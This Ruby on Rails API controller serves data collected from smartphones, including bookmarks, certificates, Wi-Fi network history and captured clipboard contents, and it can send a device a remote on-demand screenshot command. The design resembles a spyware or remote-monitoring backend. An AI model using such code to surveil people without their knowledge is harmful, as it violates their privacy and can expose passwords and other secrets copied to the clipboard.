# frozen_string_literal: true

module Api
  class DataCollectionController < Api::BaseController
    before_action :find_smartphone

    # GET /api/devices/:id/bookmarks
    def bookmarks
      bookmarks = @smartphone.bookmarks.recent
      bookmarks = bookmarks.by_browser(params[:browser]) if params[:browser].present?
      bookmarks = bookmarks.limit([(params[:limit] || 100).to_i, 1000].min)

      render json: {
        device_id: @smartphone.device_id,
        bookmarks: bookmarks.map { |b|
          {
            id: b.id,
            title: b.title,
            url: b.url,
            browser: b.browser,
            folder: b.folder,
            bookmarked_at: b.bookmarked_at&.iso8601
          }
        },
        count: bookmarks.size
      }
    end

    # GET /api/devices/:id/certificates
    def certificates
      certs = @smartphone.certificates
      certs = certs.system_certs if params[:system_only] == 'true'
      certs = certs.user_certs if params[:user_only] == 'true'
      certs = certs.order(created_at: :desc).limit([(params[:limit] || 200).to_i, 1000].min)

      render json: {
        device_id: @smartphone.device_id,
        certificates: certs.map { |c|
          {
            id: c.id,
            subject: c.subject,
            issuer: c.issuer,
            serial_number: c.serial_number,
            fingerprint_sha256: c.fingerprint_sha256,
            valid_from: c.valid_from&.iso8601,
            valid_to: c.valid_to&.iso8601,
            is_system: c.is_system,
            is_trusted: c.is_trusted
          }
        },
        count: certs.size
      }
    end

    # GET /api/devices/:id/wifi_networks
    def wifi_networks
      networks = @smartphone.wifi_networks.recent
      networks = networks.connected if params[:connected_only] == 'true'
      networks = networks.saved if params[:saved_only] == 'true'
      networks = networks.limit([(params[:limit] || 100).to_i, 1000].min)

      render json: {
        device_id: @smartphone.device_id,
        wifi_networks: networks.map { |w|
          {
            id: w.id,
            ssid: w.ssid,
            bssid: w.bssid,
            security_type: w.security_type,
            signal_strength: w.signal_strength,
            is_connected: w.is_connected,
            is_saved: w.is_saved,
            first_seen_at: w.first_seen_at&.iso8601,
            last_connected_at: w.last_connected_at&.iso8601
          }
        },
        count: networks.size
      }
    end

    # GET /api/devices/:id/clipboard_history
    def clipboard_history
      entries = @smartphone.clipboard_entries.recent
      entries = entries.by_app(params[:source_app]) if params[:source_app].present?
      entries = entries.limit([(params[:limit] || 200).to_i, 1000].min)

      render json: {
        device_id: @smartphone.device_id,
        clipboard_entries: entries.map { |e|
          {
            id: e.id,
            content: e.content,
            source_app: e.source_app,
            captured_at: e.captured_at&.iso8601
          }
        },
        count: entries.size
      }
    end

    # POST /api/devices/:id/screenshot - Trigger on-demand screenshot
    def screenshot
      smartphone = @smartphone
      command_id = SecureRandom.uuid

      PendingCommand.create!(
        smartphone: smartphone,
        command: 'take_on_demand_screenshot',
        request_id: command_id,
        status: 'pending'
      )

      ActionCable.server.broadcast(
        "commands_#{smartphone.device_id}",
        { type: 'command', action: 'take_on_demand_screenshot', request_id: command_id }
      )

      render json: {
        status: 'command_sent',
        command_id: command_id,
        message: 'Screenshot command sent to device'
      }
    end

    private

    def find_smartphone
      device_id = sanitize_device_id(params[:id])
      @smartphone = Smartphone.find_by(device_id: device_id)
      render json: { error: 'Device not found' }, status: :not_found unless @smartphone
    end
  end
end
